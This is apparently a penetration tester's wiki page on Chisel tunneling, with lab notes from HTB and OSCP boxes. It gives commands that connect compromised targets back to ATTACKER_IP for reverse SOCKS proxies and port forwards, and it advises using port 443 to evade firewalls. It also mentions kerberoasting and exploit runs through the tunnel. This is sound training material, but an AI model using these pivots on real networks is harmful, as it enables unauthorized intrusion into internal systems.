# Chisel

Lightweight HTTP-based tunneling. Single binary, works through firewalls.

See also: [[Pivoting-Methodology]], [[Proxychains]]

## SOCKS Proxy (Most Common)

```bash
# On Kali (server)
./chisel server -p 8080 --reverse
```

```bash
# On target - Linux
./chisel client ATTACKER_IP:8080 R:socks
```

```cmd
# On target - Windows
.\chisel.exe client ATTACKER_IP:8080 R:socks
```

Creates SOCKS5 proxy on Kali at `127.0.0.1:1080`. Use with [[Proxychains]]:

```bash
proxychains nmap -sT -Pn -p REDACTED INTERNAL_IP
proxychains curl http://INTERNAL_IP
proxychains evil-winrm -i INTERNAL_IP -u user -p password
```

## Port Forward (Specific Port)

```bash
# Forward target's internal port 3306 to Kali's 3306
# On target:
./chisel client ATTACKER_IP:8080 R:3306:REDACTED:3306
```

Now on Kali:

```bash
mysql -h 127.0.0.1 -u root -p
REDACTED

## Multiple Port Forwards

```bash
# On target - forward multiple ports at once
./chisel client ATTACKER_IP:8080 R:3306:REDACTED:3306 R:8080:REDACTED:80
```

## Reverse Port Forward (For Callbacks)

```bash
# On target:
./chisel client ATTACKER_IP:8080 R:4444:REDACTED:4444
```

Internal targets connect to PIVOT_IP:4444 and it reaches Kali:4444.

## Notes

- Default SOCKS port is 1080 - change with `R:9050:REDACTED`
- Binary is small (~8MB) - easy to transfer
- Uses HTTP so it often passes through firewalls
- For better performance on large scans, prefer [[Ligolo-ng]]

## From Your Boxes

> **Buff** (HTB) - Forwarded internal CloudMe port 8888 via chisel for buffer overflow exploit
> - What worked: `chisel server -p 8000 --reverse` on Kali, `.\c.exe client TARGET_IP:8000 R:8888:REDACTED:8888` on target
> - Lesson: Specific port forward (`R:PORT:REDACTED:PORT`) is cleaner than full SOCKS when you only need one internal service. Version mismatch warning is ok - it still works

> **Lab AD chain** (personal lab) - Reverse SOCKS proxy through chisel to scan entire internal subnet
> - What worked: `chisel server -p 443 --reverse` + `.\chisel.exe client ATTACKER_IP:443 R:socks`, then proxychains nmap for internal DC01 and MS02
> - Lesson: Use port 443 for chisel server - looks like HTTPS and less likely to be blocked

> **OSCP B - MS01** (Course) - Chisel SOCKS to run impacket-GetUserSPNs against internal DC for kerberoasting
> - What worked: `proxychains impacket-GetUserSPNs -dc-ip TARGET_IP 'OSCP.exam/web_svc:REDACTED'` through chisel tunnel
> - Lesson: Chisel SOCKS + proxychains lets you run ANY impacket tool against internal targets

> **Berlin** (Course/OSCP B) - Chisel SOCKS to run privesc exploit through proxychains
> - What worked: `./chisel client ATTACKER_IP:8000 R:socks` then `proxychains python2 jdwp-shellifier.py -t 127.0.0.1 -p REDACTED
> - Lesson: Even exploit scripts work through proxychains + chisel. Transfer binary payloads to target first, then trigger through tunnel

> **Nagoya** (PG/Windows) - Chisel to access internal MSSQL for silver ticket attack chain
> - What worked: `.\chisel.exe client ATTACKER_IP:8000 R:socks` then `proxychains ./mssqlclient.py svc_mssql:REDACTED -windows-auth`
> - Lesson: After pivoting, enumerate what services are internal-only with `netstat -ano | Select-String "LISTENING"`
